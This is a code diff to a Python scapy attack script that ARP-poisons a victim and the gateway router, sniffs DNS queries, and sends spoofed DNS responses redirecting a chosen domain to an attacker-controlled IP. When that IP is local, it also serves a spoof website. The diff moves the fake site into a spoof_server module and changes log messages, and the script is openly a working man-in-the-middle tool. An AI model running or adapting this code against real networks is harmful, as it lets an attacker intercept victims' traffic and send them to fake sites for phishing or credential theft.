@@ -3,7 +3,7 @@ from scapy.all import *
 import threading
 import time
 from utils import get_gateway_ip, network_utils
-from website import host
+from spoof_website import spoof_server
 # First: we need to poison the gateway router and the victim's ARP table for the gateway router.
 # Then we need to send a DNS request for the to-be-spoofed domain, to analyze the response.
 # We then spoof the reponse so it reroutes the domain the the spoof ip, and spam this spoofed response to the victim.
@@ -14,6 +14,7 @@ def run(args):
     interface = args.interface
     victim_ip = args.victim_ip
     route_to_local = spoof_ip == get_if_addr(interface)
+    local_port = spoof_server.PORT
 
     # Spoof the gateway router
     gateway_ip = get_gateway_ip.find_gateway_ip()
@@ -27,7 +28,7 @@ def run(args):
             dns_req = packet.getlayer(DNS).qd.qname
             
             if domain in dns_req:
-                print( "Intercepted DNS request for {}".format(dns_req))
+                print( "[|] Intercepted DNS request for {}".format(dns_req))
 
                 # Build the spoofed DNS response
                 dns_response = (
@@ -46,7 +47,7 @@ def run(args):
 
                 # Send the spoofed response
                 sendp(dns_response, iface=interface)  # Adjust the interface as needed
-                print("Sent spoofed DNS response for {} to {}".format(dns_req, spoof_ip))
+                print("[|] Sent spoofed DNS response for {} to {}".format(dns_req, spoof_ip))
 
     try:
 
@@ -56,26 +57,25 @@ def run(args):
         arp_poison_thread.start()
 
         if (route_to_local):
-
-            print("Spoof IP is the same as the attacker's IP. Loading up website...")
-            website_thread = threading.Thread(target=host.run)
-            website_thread.setDaemon(True)
-            website_thread.start()
-        print("Started sniffing udp port 53...")
+            print("[+] Spoof IP is the same as the attacker's IP. Loading up website...")
+            server, server_thread = spoof_server.run_server()
+        
+        print("[+] Started sniffing UDP on Port 53...")
         sniff(filter="udp port 53", prn=dns_spoof_packet, iface=interface)
-        print("Stopping sniffing... (Ctrl+C again to stop the ARP Poisoning too.)")
+        print("[-] Stopping sniffing... (Ctrl+C again to stop the ARP Poisoning too.)")
 
         while not stop_event.is_set():
             time.sleep(0.5)
-            print("Schleep")
+
     except (KeyboardInterrupt, SystemExit):
-        print("Interrupted, joining threads...")
+        print("[-] Interrupted, joining threads...")
         stop_event.set()
         poisoner.stop()
         arp_poison_thread.join()
         if (route_to_local):
-            
-            website_thread.join()
+            print("[-] Stopping server...")
+            server.stop()
+            server_thread.join()
     
     
 
